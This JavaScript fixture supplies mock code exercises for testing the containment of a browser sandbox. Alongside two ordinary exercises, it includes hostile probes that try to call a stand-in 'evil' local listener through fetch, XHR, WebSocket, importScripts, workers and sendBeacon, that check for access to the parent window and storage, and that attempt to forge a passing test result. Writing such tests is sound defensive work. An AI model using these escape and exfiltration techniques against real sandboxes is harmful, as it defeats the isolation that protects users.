/**
 * Code exercises of the mock tenant API (ADR 0170): a normal JavaScript and a TypeScript exercise, and three
 * hostile ones for the containment checks in tests/a11y/code-exercise.a11y.spec.ts. Their code is the
 * "author" and "learner" input a real tenant could hold: the sandbox, not the code, must keep it harmless.
 *
 * The hostile exercises call an "evil" listener (tests/mock-api/evil.mjs, EVIL_PORT) that records every request
 * it receives. Containment means it never receives one.
 */
export const EVIL_PORT = Number(process.env.A11Y_EVIL_PORT ?? 4399);
const EVIL = `http://127.0.0.1:${EVIL_PORT}`;
const TYPE = "Ulams\\CodeExercises\\Models\\CodeExerciseTopic";

const exercise = (id, title, order, topicable) => ({
  id,
  title,
  lesson_id: 1,
  active: true,
  preview: false,
  order,
  topicable_id: id,
  topicable_type: TYPE,
  topicable: { id, runtime: "browser", grading: "practice", timeout_ms: 5000, completion_rule: "on_pass", pass_score: 100, ...topicable },
});

export const SUM = 902;
export const DOUBLE = 903;
export const NETWORK = 904;
export const ESCAPE = 905;
export const LOOP = 906;
export const LEARNER_LOOP = 907;

const sumTests = `import { sum } from './sum.js';

test('adds two numbers', () => expect(sum(1, 2)).toBe(3));
test('adds negative numbers', () => expect(sum(-1, -2)).toBe(-3));
test('adds zero', () => expect(sum(5, 0)).toBe(5));
`;

export const codeExerciseTopics = [
  exercise(SUM, "Make sum add", 101, {
    language: "javascript",
    text: "Change `sum` so that it returns the **sum** of its two arguments, then press *Run tests*.",
    files: [{ path: "sum.js", content: "export function sum(a, b) {\n  return 0;\n}\n" }],
    visible_tests: [{ path: "sum.test.js", content: sumTests }],
  }),
  exercise(DOUBLE, "Double it in TypeScript", 102, {
    language: "typescript",
    text: "Write `double` so it returns twice its argument.",
    files: [{ path: "double.ts", content: "export function double(n: number): number {\n  return n;\n}\n" }],
    visible_tests: [{ path: "double.test.ts", content: "import { double } from './double';\n\ntest('doubles 4', () => expect(double(4)).toBe(8));\ntest('doubles 0', () => expect(double(0)).toBe(0));\n" }],
  }),
  // network access: every way out of the worker, aimed at a listener that must never hear from it
  exercise(NETWORK, "Network probes", 103, {
    language: "javascript",
    text: "Each test tries to reach the outside world. They must all be blocked.",
    files: [
      {
        path: "probe.js",
        content: `const EVIL = ${JSON.stringify(EVIL)};
export const attempts = [
  ['fetch', () => fetch(EVIL + '/fetch')],
  ['XMLHttpRequest', () => { const x = new XMLHttpRequest(); x.open('GET', EVIL + '/xhr'); x.send(); }],
  ['WebSocket', () => new WebSocket(EVIL.replace('http', 'ws') + '/ws')],
  ['EventSource', () => new EventSource(EVIL + '/sse')],
  ['importScripts', () => importScripts(EVIL + '/script.js')],
  ['a dynamic import', () => import(EVIL + '/module.js')],
  ['a new Worker', () => new Worker(EVIL + '/worker.js')],
  ['sendBeacon', () => navigator.sendBeacon(EVIL + '/beacon', 'x')],
  ['the fetch of the prototype chain', () => Object.getPrototypeOf(self).fetch.call(self, EVIL + '/proto')],
  ['fetch of the content origin itself', () => fetch(location.href)],
];
`,
      },
    ],
    visible_tests: [
      {
        path: "probe.test.js",
        content: `import { attempts } from './probe.js';

for (const [name, run] of attempts) {
  test(name + ' is blocked', async () => {
    let outcome = 'allowed';
    try {
      await run();
    } catch {
      outcome = 'blocked';
    }
    expect(outcome).toBe('blocked');
  });
}
`,
      },
    ],
  }),
  // parent access and forged results: the code has no window, and cannot sign a result
  exercise(ESCAPE, "Escape probes", 104, {
    language: "javascript",
    text: "The code tries to reach the page around it, and to report a result it did not earn.",
    files: [
      {
        path: "escape.js",
        content: `export const reach = () => ({
  window: typeof window,
  document: typeof document,
  parent: typeof parent,
  top: typeof top,
  opener: typeof opener,
  frames: typeof frames,
  localStorage: typeof localStorage,
  indexedDB: typeof indexedDB,
  caches: typeof caches,
  postMessage: typeof postMessage,
});

// try to report a result the harness did not give: only the harness holds the secret of the run
export function forge() {
  const sends = [];
  for (const holder of [self, Object.getPrototypeOf(self), Object.getPrototypeOf(Object.getPrototypeOf(self))]) {
    const post = holder && Object.getOwnPropertyDescriptor(holder, 'postMessage')?.value;
    if (typeof post === 'function') sends.push(() => post.call(self, { type: 'result', token: 'guess', tests: [{ name: 'forged', status: 'pass' }], output: '', truncated: false }));
  }
  for (const send of sends) send();
  return sends.length;
}
`,
      },
    ],
    visible_tests: [
      {
        path: "escape.test.js",
        content: `import { reach, forge } from './escape.js';

test('there is no window, document, parent, top or storage', () => {
  for (const [name, type] of Object.entries(reach())) expect([name, type]).toEqual([name, 'undefined']);
});
test('a forged result cannot be sent', () => {
  expect(forge()).toBe(0);
});
`,
      },
    ],
  }),
  // an endless loop in the author's code: stopped at the limit, the page stays usable
  exercise(LOOP, "Endless loop in a test", 105, {
    language: "javascript",
    timeout_ms: 1000,
    text: "The code under test never returns.",
    files: [{ path: "work.js", content: "export function work() {\n  while (true) {\n    // never ends\n  }\n}\n" }],
    visible_tests: [{ path: "work.test.js", content: "import { work } from './work.js';\n\ntest('finishes', () => { work(); });\n" }],
  }),
  // an endless loop in the learner's own file, which the learner fixes and runs again
  exercise(LEARNER_LOOP, "Fix the endless loop", 106, {
    language: "javascript",
    timeout_ms: 1000,
    text: "The starter code loops forever when the file loads. Remove the loop.",
    files: [{ path: "count.js", content: "let n = 0;\nwhile (true) {\n  n++;\n}\nexport const count = () => n;\n" }],
    visible_tests: [{ path: "count.test.js", content: "import { count } from './count.js';\n\ntest('counts', () => expect(typeof count()).toBe('number'));\n" }],
  }),
];

/** The launch answer of the real API for one of these topics. */
export function launchOf(topic, runnerUrl, attempts) {
  const t = topic.topicable;
  return {
    runner: { url: runnerUrl, version: 1 },
    exercise: {
      language: t.language,
      files: t.files,
      tests: t.visible_tests,
      timeout_ms: t.timeout_ms,
      completion_rule: t.completion_rule,
      pass_score: t.pass_score,
      text: t.text ?? null,
    },
    attempts: { count: attempts.length, best_score: attempts.length ? Math.max(...attempts.map((a) => a.score)) : null, last: attempts.at(-1) ?? null },
  };
}
